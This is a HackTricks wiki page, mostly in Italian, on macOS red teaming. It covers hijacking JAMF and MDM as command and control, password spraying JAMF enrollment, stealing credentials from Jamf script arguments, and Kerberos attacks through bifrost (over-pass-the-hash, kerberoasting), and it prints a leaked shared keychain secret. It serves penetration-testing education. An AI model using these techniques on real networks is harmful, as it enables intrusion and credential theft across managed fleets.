# macOS Red Teaming

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Ottieni la prospettiva di un hacker sulle tue app web, rete e cloud**

**Trova e segnala vulnerabilità critiche ed esploitabili con un reale impatto sul business.** Usa i nostri oltre 20 strumenti personalizzati per mappare la superficie di attacco, trovare problemi di sicurezza che ti consentono di elevare i privilegi e utilizzare exploit automatizzati per raccogliere prove essenziali, trasformando il tuo duro lavoro in report persuasivi.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Abusare degli MDM

* JAMF Pro: `jamf checkJSSConnection`
* Kandji

Se riesci a **compromettere le credenziali di amministratore** per accedere alla piattaforma di gestione, puoi **potenzialmente compromettere tutti i computer** distribuendo il tuo malware nelle macchine.

Per il red teaming negli ambienti MacOS è altamente raccomandato avere una certa comprensione di come funzionano gli MDM:

{% content-ref url="macos-mdm/" %}
[macos-mdm](macos-mdm/)
{% endcontent-ref %}

### Utilizzare MDM come C2

Un MDM avrà il permesso di installare, interrogare o rimuovere profili, installare applicazioni, creare account admin locali, impostare password firmware, cambiare la chiave FileVault...

Per eseguire il tuo MDM devi **far firmare il tuo CSR da un fornitore** che potresti provare a ottenere con [**https://mdmcert.download/**](https://mdmcert.download/). E per eseguire il tuo MDM per dispositivi Apple potresti usare [**MicroMDM**](https://github.com/micromdm/micromdm).

Tuttavia, per installare un'applicazione in un dispositivo registrato, hai ancora bisogno che sia firmata da un account sviluppatore... tuttavia, al momento della registrazione MDM, il **dispositivo aggiunge il certificato SSL dell'MDM come CA fidata**, quindi ora puoi firmare qualsiasi cosa.

Per registrare il dispositivo in un MDM, devi installare un file **`mobileconfig`** come root, che potrebbe essere consegnato tramite un file **pkg** (puoi comprimerlo in zip e quando viene scaricato da safari verrà decompresso).

**L'agente Mythic Orthrus** utilizza questa tecnica.

### Abusare di JAMF PRO

JAMF può eseguire **script personalizzati** (script sviluppati dall'amministratore di sistema), **payload nativi** (creazione di account locali, impostazione della password EFI, monitoraggio di file/processi...) e **MDM** (configurazioni del dispositivo, certificati del dispositivo...).

#### Auto-registrazione JAMF

Vai a una pagina come `https://<company-name>.jamfcloud.com/enroll/` per vedere se hanno **l'auto-registrazione abilitata**. Se ce l'hanno, potrebbe **richiedere credenziali per accedere**.

Potresti usare lo script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) per eseguire un attacco di password spraying.

Inoltre, dopo aver trovato le credenziali corrette, potresti essere in grado di forzare altri nomi utente con il modulo successivo:

![](<../../.gitbook/assets/image (107).png>)

#### Autenticazione del dispositivo JAMF

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

Il **binary `jamf`** conteneva il segreto per aprire il portachiavi che al momento della scoperta era **condiviso** tra tutti ed era: **`jk23ucnq91jfu9aj`**.\
Inoltre, jamf **persiste** come un **LaunchDaemon** in **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Presa di controllo del dispositivo JAMF

L'**URL** del **JSS** (Jamf Software Server) che **`jamf`** utilizzerà si trova in **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Questo file contiene fondamentalmente l'URL:

{% code overflow="wrap" %}
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
{% endcode %}

Quindi, un attaccante potrebbe installare un pacchetto malevolo (`pkg`) che **sovrascrive questo file** impostando l'**URL a un listener Mythic C2 da un agente Typhon** per poter abusare di JAMF come C2.

{% code overflow="wrap" %}
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
{% endcode %}

#### JAMF Impersonation

Per **impersonare la comunicazione** tra un dispositivo e JMF hai bisogno di:

* Il **UUID** del dispositivo: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
* Il **keychain JAMF** da: `/Library/Application\ Support/Jamf/JAMF.keychain` che contiene il certificato del dispositivo

Con queste informazioni, **crea una VM** con il **UUID** Hardware **rubato** e con **SIP disabilitato**, inserisci il **keychain JAMF,** **hook** l'agente Jamf e ruba le sue informazioni.

#### Secrets stealing

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Puoi anche monitorare la posizione `/Library/Application Support/Jamf/tmp/` per gli **script personalizzati** che gli amministratori potrebbero voler eseguire tramite Jamf poiché vengono **posizionati qui, eseguiti e rimossi**. Questi script **potrebbero contenere credenziali**.

Tuttavia, le **credenziali** potrebbero essere passate a questi script come **parametri**, quindi dovresti monitorare `ps aux | grep -i jamf` (senza nemmeno essere root).

Lo script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) può ascoltare nuovi file aggiunti e nuovi argomenti di processo.

### macOS Remote Access

E anche riguardo ai **protocollo** **di rete** "speciali" **MacOS**:

{% content-ref url="../macos-security-and-privilege-escalation/macos-protocols.md" %}
[macos-protocols.md](../macos-security-and-privilege-escalation/macos-protocols.md)
{% endcontent-ref %}

## Active Directory

In alcune occasioni scoprirai che il **computer MacOS è connesso a un AD**. In questo scenario dovresti cercare di **enumerare** l'active directory come sei abituato a fare. Trova qualche **aiuto** nelle seguenti pagine:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/active-directory-methodology/" %}
[active-directory-methodology](../../windows-hardening/active-directory-methodology/)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-kerberos-88/" %}
[pentesting-kerberos-88](../../network-services-pentesting/pentesting-kerberos-88/)
{% endcontent-ref %}

Alcuni **strumenti locali MacOS** che potrebbero anche aiutarti sono `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Also there are some tools prepared for MacOS to automatically enumerate the AD and play with kerberos:

* [**Machound**](https://github.com/XMCyber/MacHound): MacHound è un'estensione dello strumento di auditing Bloodhound che consente di raccogliere e ingerire le relazioni di Active Directory su host MacOS.
* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost è un progetto Objective-C progettato per interagire con le API Heimdal krb5 su macOS. L'obiettivo del progetto è abilitare test di sicurezza migliori attorno a Kerberos sui dispositivi macOS utilizzando API native senza richiedere alcun altro framework o pacchetti sul target.
* [**Orchard**](https://github.com/its-a-feature/Orchard): Strumento JavaScript for Automation (JXA) per eseguire l'enumerazione di Active Directory.

### Domain Information
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Utenti

I tre tipi di utenti MacOS sono:

* **Utenti Locali** — Gestiti dal servizio OpenDirectory locale, non sono collegati in alcun modo all'Active Directory.
* **Utenti di Rete** — Utenti Active Directory volatili che richiedono una connessione al server DC per autenticarsi.
* **Utenti Mobili** — Utenti Active Directory con un backup locale per le loro credenziali e file.

Le informazioni locali sugli utenti e sui gruppi sono memorizzate nella cartella _/var/db/dslocal/nodes/Default._\
Ad esempio, le informazioni sull'utente chiamato _mark_ sono memorizzate in _/var/db/dslocal/nodes/Default/users/mark.plist_ e le informazioni sul gruppo _admin_ si trovano in _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Oltre a utilizzare i bordi HasSession e AdminTo, **MacHound aggiunge tre nuovi bordi** al database Bloodhound:

* **CanSSH** - entità autorizzata a SSH al host
* **CanVNC** - entità autorizzata a VNC al host
* **CanAE** - entità autorizzata a eseguire script AppleEvent sul host
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Maggiore informazione in [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ password

Ottieni le password usando:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
È possibile accedere alla password **`Computer$`** all'interno del portachiavi di sistema.

### Over-Pass-The-Hash

Ottieni un TGT per un utente e un servizio specifici:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Una volta raccolto il TGT, è possibile iniettarlo nella sessione corrente con:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Con i ticket di servizio ottenuti è possibile provare ad accedere alle condivisioni in altri computer:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Accessing the Keychain

Il Keychain contiene molto probabilmente informazioni sensibili che, se accessibili senza generare un prompt, potrebbero aiutare a portare avanti un esercizio di red team:

{% content-ref url="macos-keychain.md" %}
[macos-keychain.md](macos-keychain.md)
{% endcontent-ref %}

## External Services

Il Red Teaming su MacOS è diverso dal Red Teaming su Windows, poiché di solito **MacOS è integrato con diverse piattaforme esterne direttamente**. Una configurazione comune di MacOS è accedere al computer utilizzando **credenziali sincronizzate di OneLogin e accedere a diversi servizi esterni** (come github, aws...) tramite OneLogin.

## Misc Red Team techniques

### Safari

Quando un file viene scaricato in Safari, se è un file "sicuro", verrà **aperto automaticamente**. Quindi, ad esempio, se **scarichi un zip**, verrà automaticamente decompresso:

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

## References

* [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
* [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
* [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
* [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
* [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Get a hacker's perspective on your web apps, network, and cloud**

**Find and report critical, exploitable vulnerabilities with real business impact.** Use our 20+ custom tools to map the attack surface, find security issues that let you escalate privileges, and use automated exploits to collect essential evidence, turning your hard work into persuasive reports.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
